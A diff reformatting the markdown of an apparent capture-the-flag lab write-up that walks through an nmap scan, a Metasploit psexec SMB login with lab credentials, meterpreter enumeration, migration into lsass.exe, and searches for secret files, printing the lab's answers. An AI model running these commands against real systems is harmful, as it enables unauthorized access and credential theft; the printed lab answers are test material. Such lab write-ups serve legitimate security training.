@@ -51,11 +51,13 @@ No answer needed
 
 ### 5.1: What is the computer name?
 
+<br />
+
 We will be using nmap to gather information on the target system.
 ```
 nmap -sC -sV -oN nmap/initial TARGET_IP
 ```
-The output of the "initial" file we created under the "nmap" folder as follows:
+The output of the ```initial``` file we created under the ```nmap``` folder as follows:
 ```
 # Nmap 7.92 scan initiated Fri May 27 08:51:05 2022 as: nmap -sC -sV -oN nmap/initial 10.10.133.146
 Nmap scan report for 10.10.133.146
@@ -104,21 +106,30 @@ Host script results:
 Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
 # Nmap done at Fri May 27 08:51:57 2022 -- 1 IP address (1 host up) scanned in 52.75 seconds
 ```
-As instructed, we can use the "exploit/windows/smb/psexec" module from the msfconsole for an initial SMB attack.
-```
-msfconsole
-use exploit/windows/smb/psexec
-set LHOST LOCAL_IP
-set RHOSTS TARGET_IP
-set SMBUser ballen
-set SMBPass Password1
-run
-```
-The shell should now be up and running. To check the system information we simply use the "sysinfo" command, also hinted at us on the question.
+
+<br />
+
+As instructed, we can use the ```exploit/windows/smb/psexec``` module from the msfconsole for an initial SMB attack.
+
+```msfconsole```
+<br />
+```use exploit/windows/smb/psexec```
+<br />
+```set LHOST LOCAL_IP```
+<br />
+```set RHOSTS TARGET_IP```
+<br />
+```set SMBUser ballen```
+<br />
+```set SMBPass Password1```
+<br />
+```run```
+
+The shell should now be up and running. To check the system information we simply use the ```sysinfo``` command, also hinted at us on the question.
 
 ![image](https://user-images.githubusercontent.com/14150485/170658359-f6584741-597e-40f9-aaf8-057e9984c598.png)
 
-The computer name is "ACME-TEST"
+The computer name is ```ACME-TEST```.
 ```
 ACME-TEST
 ```
@@ -126,7 +137,7 @@ ACME-TEST
 
 ### 5.2: What is the target domain?
 
-To get this information we need to push the current meterpreter shell to the background for a second so we can use the "post/windows/gather/enum_domain" module.
+To get this information we need to push the current meterpreter shell to the background for a second so we can use the ```post/windows/gather/enum_domain``` module.
 ```
 background
 ```
@@ -134,19 +145,20 @@ Alternatively, we can use:
 ```
 Ctrl + Z
 ```
-Now that the process is running in the background, we may proceed with the "enum_domain" module.
+Now that the process is running in the background, we may proceed with the ```enum_domain``` module.
 ```
 use post/windows/gather/enum_domain
 ```
-The only setting we need for this one is "SESSION", the number of which we can find by using the "sessions" command.
+The only setting we need for this one is ```SESSION```, the number of which we can find by using the ```sessions``` command.
 
 ![2022-05-27 09_08_50-Kali  Running  - Oracle VM VirtualBox](https://user-images.githubusercontent.com/14150485/170658890-a82b5d01-0b48-4320-9f0a-8ba7183507a3.png)
 
 We set the session and run the exploit.
-```
-set SESSION SESSION_ID
-run
-```
+
+```set SESSION SESSION_ID```
+<br />
+```run```
+
 The output shows the domain name.
 
 ![image](https://user-images.githubusercontent.com/14150485/170659878-f4ebb96e-1c21-4bb7-8265-6fbd9b5440e6.png)
@@ -157,11 +169,11 @@ FLASH
 
 ### 5.3: What is the name of the share likely created by the user? 
 
-As per the hint, module "post/windows/gather/enum_shares" will get us this information.
+As per the hint, module ```post/windows/gather/enum_shares``` will get us this information.
 ```
 use post/windows/gather/enum_shares
 ```
-Once again, the only setting we need before running the exploit is called "SESSION".
+Once again, the only setting we need before running the exploit is called ```SESSION```.
 ```
 set SESSION SESSION_ID
 run
@@ -180,13 +192,13 @@ Resume the meterpreter session running in the background.
 ```
 session -i SESSION_ID
 ```
-Per the hint on this task, we need to migrate the "lsass.exe" process. However, we first need to find its number.
+Per the hint on this task, we need to migrate the ```lsass.exe``` process. However, we first need to find its number.
 ```
 ps aux | grep -iF 'lsass.exe'
 ```
 ![image](https://user-images.githubusercontent.com/14150485/170661464-72dd745e-30f4-4b96-a8b0-a056fb7dddaf.png)
 
-Now that we know what the "PID" number is we can proceed to migrate it as instructed.
+Now that we know what the ```PID``` number is we can proceed to migrate it as instructed.
 ```
 migrate PID
 ```
@@ -219,7 +231,7 @@ Trustno1
 ```
 search -f secrets.txt
 ```
-The file is located in the "C:\Program Files (x86)\Windows Multimedia Platform\\" folder.
+The file is located in the ```C:\Program Files (x86)\Windows Multimedia Platform\``` folder.
 
 ![image](https://user-images.githubusercontent.com/14150485/170663807-4eceae66-9e14-47f5-b626-484aa333e454.png)
 ```
@@ -243,7 +255,7 @@ KDSvbsw3849!
 search -f realsecret.txt
 ```
 
-The "realsecret.txt" file is located under the "C:\inetpub\wwwroot\\" folder.
+The ```realsecret.txt``` file is located under the ```C:\inetpub\wwwroot\``` folder.
 
 ![image](https://user-images.githubusercontent.com/14150485/170664342-1fa9a5af-84bb-4a5f-9382-77f1cd16bb58.png)
 ```
@@ -258,7 +270,7 @@ cat realsecret.txt
 ![image](https://user-images.githubusercontent.com/14150485/170664691-578353ce-3433-4460-b251-aae0531a18f6.png)
 
 
-Well, looks like "The Flash is the fastest man alive" - No secret there!
+Well, looks like ```The Flash is the fastest man alive``` - No secret there!
 ```
 The Flash is the fastest man alive
 ```
